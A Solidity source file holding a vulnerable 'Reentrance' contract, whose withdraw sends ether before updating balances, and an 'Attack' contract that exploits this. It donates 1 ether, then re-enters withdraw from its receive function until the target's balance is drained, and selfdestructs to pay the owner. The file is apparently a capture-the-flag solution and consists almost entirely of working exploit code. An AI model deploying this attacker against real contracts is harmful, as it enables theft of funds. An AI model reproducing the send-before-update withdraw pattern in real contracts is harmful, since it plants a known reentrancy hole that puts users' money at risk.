pragma solidity ^0.6.0;

interface IReentrancy {
    function donate(address) external payable;

    function withdraw(uint256) external;
}

contract Attack {
    IReentrancy target;
    address owner;

    constructor(address _target) public {
        target = IReentrancy(_target);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    // NOTE: attack cannot be called inside constructor
    function attack() external payable {
        target.donate.value(1 ether)(address(this));
        target.withdraw(1 ether);
        require(address(target).balance == 0, "target balance > 0");
    }

    function destroy() public onlyOwner {
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint256 amount = 1 ether <= address(target).balance
            ? 1 ether
            : address(target).balance;
        if (amount > 0) {
            target.withdraw(amount);
        }
    }
}

contract Reentrance {
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] += msg.value;
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call.value(_amount)("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
